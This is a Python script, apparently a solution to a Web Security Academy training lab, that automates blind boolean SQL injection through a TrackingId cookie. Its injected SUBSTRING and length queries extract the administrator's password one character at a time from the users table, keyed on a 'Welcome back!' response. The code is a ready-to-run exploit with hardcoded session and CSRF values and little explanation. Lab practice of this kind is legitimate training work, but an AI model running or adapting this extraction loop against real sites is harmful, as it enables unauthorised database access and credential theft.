import requests


def brute_len(url,data):
    for i in range(1,50):
        payload = f"0' or length((SELECT password FROM users WHERE username='administrator'))<{str(i)}--"
        cookies = {'TrackingId':payload,'session':'HQafyFRZprUE9sWalVDlAc8oGgqhSgVC'}
        r = requests.post(url, data=data,cookies=cookies)
        print(f"i is {i} ： " + payload)
        if 'Welcome back!' in r.text:
            return i
        else:
            continue
def brute_content(url,data,len):

    char_lists = "0123456789abcdefghijklmnopqrstuvwxyz"
    result = ''
    print("password:")
    for i in range(1,len+1):
        print(f"正在爆破第{i}个字符 \n")
        for j in char_lists:
            payload = f"0' or SUBSTRING((SELECT password FROM users WHERE username='administrator'),{str(i)},1)='{j}'--"
            cookies = {'TrackingId':payload,'session':'HQafyFRZprUE9sWalVDlAc8oGgqhSgVC'}
            r = requests.post(url, data=data, cookies=cookies)
            if 'Welcome back!' in r.text:
                print(f"第{i}个字符是：{j}")
                result += j
                break
            else:
                continue
    print(f"password : {result}")
    
if __name__ == '__main__':
    #payload = f"0'+OR+'1'='1'--"
    payload = f"0' or length((SELECT password FROM users WHERE username='administrator'))>0--"
    url = 'https://0a89009a04ee3b4b809c7bfc0010008d.web-security-academy.net/login'
    cookies = {'TrackingId':payload,'session':'HQafyFRZprUE9sWalVDlAc8oGgqhSgVC'}
    data = {'csrf':'Mz4zFjEolQlqsxQHHk4j80IsxVIv7ktV','username':'administrator"','password':'123123'}
    # response = requests.post(url, data=data, cookies=cookies)
    # if 'Welcome back!' in response.text:
    #     print(response.text)
    #     print("condtition is true")
    # else:
    #     print("condition is false")
        #print(response.text)
    #password_len = brute_len(url,data)
    # password_len = 21
    password_len = 21
    brute_content(url,data,password_len)
